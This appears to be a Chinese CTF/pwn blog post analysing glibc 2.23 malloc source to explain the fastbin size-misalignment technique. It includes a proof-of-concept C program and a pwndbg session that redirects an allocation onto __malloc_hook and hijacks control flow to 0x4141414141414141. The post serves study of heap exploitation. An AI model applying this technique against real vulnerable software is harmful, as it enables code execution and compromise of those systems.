---
title: fastbin size错位构造及源码分析
date: 2021-09-04 18:44:59
tags:
    - pwn
    - 源码分析
    - how2heap
    - fastbin
categories:
    - pwn
---

## fastbin size错位构造
> 这个主要是较之于tcache修改fd指针为libc区域 直接就能申请到那段空间
而在glibc2.23中没有tcache。但是也可通过在libc区域错位构造size，来申请那段空间

```c
/* offset 2 to use otherwise unindexable first 2 bins */
#define fastbin_index(sz) \
  ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)

static void *
_int_malloc (mstate av, size_t bytes)
{

  ...
  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
      idx = fastbin_index (nb);
      mfastbinptr *fb = &fastbin (av, idx);
      mchunkptr pp = *fb;
      do
        {
          victim = pp;
          if (victim == NULL)
            break;
        }
      while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))
             != victim);
      if (victim != 0)
        {
//-------------------------------check----------------------------------------
          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
//-------------------------------check----------------------------------------
        
            {
              errstr = "malloc(): memory corruption (fast)";
            errout:
              malloc_printerr (check_action, errstr, chunk2mem (victim), av);
              return NULL;
            }
          check_remalloced_chunk (av, victim, nb);
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }

...
}



   0x7ffff7a8eeb6 <_int_malloc+806>     mov    eax, dword ptr [r15 + 8]
   0x7ffff7a8eeba <_int_malloc+810>     shr    eax, 4
   0x7ffff7a8eebd <_int_malloc+813>     sub    eax, 2
 ► 0x7ffff7a8eec0 <_int_malloc+816>     cmp    edi, eax


```
至于下边那个`check_remalloced_chunk (av, victim, nb);`
```c
#define MALLOC_DEBUG 0
...
#if !MALLOC_DEBUG
...
# define check_remalloced_chunk(A, P, N)
...
#else
...
# define check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)
...
```
在宏中预编译的是`# define check_remalloced_chunk(A, P, N)`
所以直接无视该检查就行
* size右移了4位(应该是出于size 0x10对齐的缘故)，但是只有A M P三个标志位，所以第四位无需考虑.
* 由于右移了四位,即除以2**4（16）的整数部分，即构造时例如0x70的fastbin，fake_size在`[7*16,8x16)`区间都能满足第一个size检查
* 还有`(unsigned int) (sz)`中`unsigned int`是4byte,下边的汇编也可看到如此的结果，重点是高4byte是不计算的


此外
```c
#define IS_MMAPPED 0x2
#define NON_MAIN_ARENA 0x4

#define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED)
#define chunk_non_main_arena(p) ((p)->size & NON_MAIN_ARENA)

#define heap_for_ptr(ptr) \
  ((heap_info *) ((unsigned long) (ptr) & ~(HEAP_MAX_SIZE - 1)))
#define arena_for_chunk(ptr) \
  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)->ar_ptr : &main_arena)

void *
__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;

  void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook);
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0));

  arena_get (ar_ptr, bytes);

  victim = _int_malloc (ar_ptr, bytes);
  /* Retry with another arena only if we were able to find a usable arena
     before.  */
  if (!victim && ar_ptr != NULL)
    {
      LIBC_PROBE (memory_malloc_retry, 1, bytes);
      ar_ptr = arena_get_retry (ar_ptr, bytes);
      victim = _int_malloc (ar_ptr, bytes);
    }

  if (ar_ptr != NULL)
    (void) mutex_unlock (&ar_ptr->mutex);
//--------------------------------check------------------------
  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
          ar_ptr == arena_for_chunk (mem2chunk (victim)));
//--------------------------------check------------------------
  return victim;
}
```
* 首先呢,`victim`是你伪造的地方,`!victim`不为真,向下检查
* `chunk_is_mmapped (mem2chunk (victim))`,如果条件为真,即有0x2的标志位,则总条件为真,直接结束.否则向下检查
* `ar_ptr == arena_for_chunk (mem2chunk (victim)));`,其中`ar_ptr`为`main_arena`,为了不触发断言错误,需要保证该条件成立.即需要`chunk_non_main_arena (ptr)`为假,也即没有0x4的标志位,如果有0x4的标志位,而选择去构造`heap_for_ptr (ptr)->ar_ptr`为`main_arena`，较为复杂，且`heap_for_ptr (ptr)`中的位操作容易寻址错误，就不考虑这种情况


* 标志位呢
  * `P-0x1-0b001-pre_inuse` 
  * `M-0x2-0b010-is_mmaped` 
  * `A-0x4-0b100-non_main_arena`
* 上边标志位的检查中,没有0x2的标志位,且有0x4的标志位才会触发错误.
  * ` hex(0b0100)->'0x4'`
  * ` hex(0b0101)->'0x5 `
  * ` hex(0b1100)->'0xc'` 
  * ` hex(0b1101)->'0xd'`
  * 这四种情况会报错
* 并没有看到检测地址对齐的指针。所以完全可以偏移构造size

测试代码
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
int main()
{
	uint64_t *p1 = malloc(0x68);
	uint64_t *p2 = malloc(0x68);
	malloc(0);

	free(p1);
	free(p2);

	// p2[0] = __malloc_hook-0x23

	malloc(0x68);
	uint8_t *p4 = malloc(0x68);

	memset(p4,'A',0x68);
	malloc(0);
	return 0;
}
```
断在`malloc(0x68);`
```shell
pwndbg> x/10gx ((uint8_t*)&__malloc_hook-0x23)
0x7ffff7dd1aed: 0xfff7dd0260000000	0x000000000000007f
0x7ffff7dd1afd:	0xfff7a92ea0000000	0xfff7a92a7000007f
0x7ffff7dd1b0d:	0x000000000000007f	0x0000000000000000
0x7ffff7dd1b1d:	0x0100000000000000	0x0000000000000000
0x7ffff7dd1b2d:	0x0000000000000000	0x0000000000000000

pwndbg> set p2[0] = (uint64_t)((uint8_t*)&__malloc_hook-0x23)
pwndbg> c

► 0x7ffff7a912f3 <malloc+371>    jmp    rax <0x4141414141414141>
```
其中的fake_size除了`0x74 0x75 0x7d 0x7c`其他都可以


* 利用时可以直接用dbg的`find_fake_fast addr`命令